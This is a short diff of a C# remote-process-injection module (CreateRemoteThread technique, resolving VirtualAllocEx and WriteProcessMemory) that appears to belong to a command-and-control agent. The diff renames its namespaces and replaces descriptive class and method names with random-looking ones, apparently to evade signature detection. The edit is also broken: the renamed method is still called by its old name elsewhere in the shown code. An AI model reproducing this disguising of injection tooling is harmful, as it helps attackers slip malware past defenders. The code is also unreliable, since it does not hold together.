@@ -1,12 +1,12 @@
-﻿using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Interfaces;
+﻿using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Interfaces;
 using System;
 using static Injection.Shared.Win32;
 
 namespace Injection.Techniques.CreateRemoteThread
 {
-    public class CreateRemoteThread : InjectionTechnique
+    public class IntelligentService53A0 : InjectionTechnique
     {
         private delegate IntPtr VirtualAllocEx(
            IntPtr hProcess,
@@ -50,7 +50,7 @@ namespace Injection.Techniques.CreateRemoteThread
             GetFunctionPointers();
         }
 
-        private void GetFunctionPointers()
+        private void TacticalProvider491B()
         {
             _pVirtualAllocEx = _agent.GetApi().GetLibraryFunction<VirtualAllocEx>(Library.KERNEL32, "VirtualAllocEx");
             _pWriteProcessMemory = _agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
